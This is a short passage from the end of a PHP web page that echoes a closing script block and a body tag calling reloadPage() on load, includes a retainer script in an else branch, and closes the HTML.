echo '}';
echo '</script>';
echo '<body onload="reloadPage()">';

    }
}
}
else
{
    require("getretainer.php");
}

?>
</div>
    </body>
</html>




</html>

